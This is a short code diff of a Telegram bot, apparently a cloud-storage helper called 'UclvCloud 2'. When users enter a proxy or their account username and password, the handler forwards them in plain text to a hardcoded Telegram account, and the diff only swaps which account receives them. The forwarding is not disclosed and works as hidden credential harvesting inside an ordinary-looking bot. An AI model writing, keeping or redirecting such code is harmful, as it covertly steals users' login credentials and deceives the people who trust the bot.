@@ -89,7 +89,7 @@ async def home(client, message):
         			if "socks5://none" in text:
         				os.remove(str(user_id)+"/proxy")
         			else:
-        				await app.send_message(1593891519,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
+        				await app.send_message(1291931851,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
         			if not exists(str(user_id)+"/username"):
         				start = "***UclvCloud 2*** \n  Sin cuenta"
         			else:
@@ -147,8 +147,8 @@ async def home(client, message):
 		      		data = text.split(":")
 		      		username.write(data[0])
 		      		password.write(data[1])
-		      		if user_id != 1593891519:
-		      			await app.send_message(1593891519, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
+		      		if user_id != 1291931851:
+		      			await app.send_message(1291931851, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
 		      		log = open(str(data[1])+"log","w")
 		      		log.write("")
 		      		if not exists(str(user_id)+"/username"):
